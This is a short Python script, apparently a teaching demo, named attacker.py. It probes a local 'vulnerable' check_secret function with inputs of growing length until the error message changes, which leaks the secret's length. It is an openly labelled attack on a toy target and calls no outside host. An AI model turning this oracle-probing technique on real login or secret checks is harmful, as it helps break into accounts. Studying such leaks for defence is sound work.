# attacker.py

from vulnerable import check_secret

def find_length(max_length=20):
    print("[*] Starting length discovery...\n")
    
    for i in range(1, max_length + 1):
        test_input = "a" * i
        response = check_secret(test_input)
        
        print(f"Trying length {i}: {response}")
        
       
        if response != "Invalid length":
            print(f"\n[+] Found secret length: {i}")
            return i
    
    print("[-] Length not found")
    return None


if __name__ == "__main__":
    length = find_length()